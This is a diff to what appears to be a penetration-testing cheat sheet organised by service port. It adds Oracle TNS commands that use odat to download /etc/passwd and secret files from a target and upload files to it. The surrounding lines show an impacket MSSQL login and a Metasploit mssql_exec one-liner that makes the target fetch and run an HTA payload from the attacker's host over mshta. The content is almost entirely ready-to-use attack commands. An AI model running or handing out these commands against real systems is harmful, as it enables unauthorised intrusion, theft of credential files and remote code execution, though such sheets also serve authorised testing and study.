@@ -698,6 +698,19 @@ impacket-mssqlclient '$DOM'/'$USERNAME':'$PASSWORD'@'$TARGET' -windows-auth
 msfconsole -q -x "use auxiliary/admin/mssql/mssql_exec; set RHOSTS $TARGET; set CMD mshta.exe http://$MYIP:8080/nZzLAD.hta; set USERNAME $USERNAME; set PASSWORD $PASSWORD; run;"
 sessions -i 1
 
+[*] (1521) OracleTNS
++---------- Download Files ----------+
+sudo odat utlfile -s $TARGET -n XE -U '$USERNAME' -P '$PASSWORD' --getFile 'C:\' 'secret.txt' output
+sudo odat utlfile -s $TARGET -n XE -U '$USERNAME' -P '$PASSWORD' --getFile '/etc' 'passwd' output
+sudo odat dbmsxslprocessor -s $TARGET -n XE -U '$USERNAME' -P '$PASSWORD' --getFile 'C:\' 'secret.txt' output; cat output
+sudo odat dbmsxslprocessor -s $TARGET -n XE -U '$USERNAME' -P '$PASSWORD' --getFile '/etc' 'passwd' output; cat output
+
++---------- Upload Files ----------+
+sudo odat utlfile -s $TARGET -n XE -U '$USERNAME' -P '$PASSWORD' --putFile 'C:\ProgramData\' '' upload.file
+
+
+
+
 [*] (2049) NFS
 +---------- List Mounts ----------+
 showmount -e $TARGET; mkdir nfs 2>/dev/null
